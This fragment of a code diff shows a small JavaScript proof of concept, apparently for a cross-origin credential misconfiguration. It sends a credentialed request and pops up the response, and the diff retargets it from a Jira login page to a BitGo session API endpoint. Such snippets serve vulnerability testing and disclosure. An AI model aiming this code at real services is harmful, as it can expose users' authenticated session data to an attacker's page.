@@ -16,7 +16,7 @@ if (this.readyState == 4 && this.status == 200) {
 document.getElementById("demo").innerHTML = alert(this.responseText);
 }
 };
-xhttp.open("GET", "http://jira-prod-loadbala-1706cmplqcccg-479381800.us-west-1.elb.amazonaws.com/login.jsp", true);
+xhttp.open("GET", "https://app.bitgo.com/api/auth/v1/session", true);
 xhttp.withCredentials = true;
 xhttp.send();
 }
